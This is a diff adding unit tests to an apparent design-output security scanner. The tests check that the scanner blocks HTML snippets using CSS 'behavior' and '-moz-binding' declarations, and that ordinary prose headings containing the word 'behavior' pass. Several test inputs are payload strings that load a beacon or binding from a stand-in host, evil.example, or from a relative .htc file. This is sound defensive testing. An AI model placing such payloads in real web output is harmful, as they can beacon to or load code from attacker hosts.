@@ -74,6 +74,46 @@ class TestScanDesignOutput:
         assert not report.passed
         assert any(flag in finding for finding in report.blocking_flags)
 
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        ("payload", "flag"),
+        [
+            # behavior/-moz-binding are exfil vectors only when the declaration
+            # names a payload. The value anchor keeps the vector blocked while
+            # prose headings ("**Container behavior:** ...", which
+            # trust-banned every generation of the bundled Apple system)
+            # stay renderable.
+            ('<div style="behavior: url(#default#time2)">x</div>', "CSS"),
+            ('<div style="-moz-binding: url(http://evil.example/x.xml)">x</div>', "CSS"),
+            ('<div style="behavior: https://evil.example/beacon">x</div>', "CSS"),
+            ('<div style="behavior: //evil.example/beacon">x</div>', "CSS"),
+            ('<div style="behavior: ../../evil.htc">x</div>', "CSS"),
+        ],
+    )
+    def test_behavior_binding_value_payloads_are_blocking(self, payload: str, flag: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(payload))
+        assert not report.passed
+        assert any(flag in finding for finding in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        "prose",
+        [
+            "- **Pressed Behavior:** active controls reduce scale slightly.",
+            "- **Container behavior:** constrained readable core with generous outer margins.",
+            "Design system behavior: calm, spacious, and quiet under load.",
+        ],
+    )
+    def test_behavior_prose_is_not_a_css_primitive(self, prose: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(prose))
+        assert report.passed, report.blocking_flags
+
     @pytest.mark.contract("behavioral")
     @pytest.mark.scope("unit")
     @pytest.mark.ac("ADR-062326-702b/AC-4")
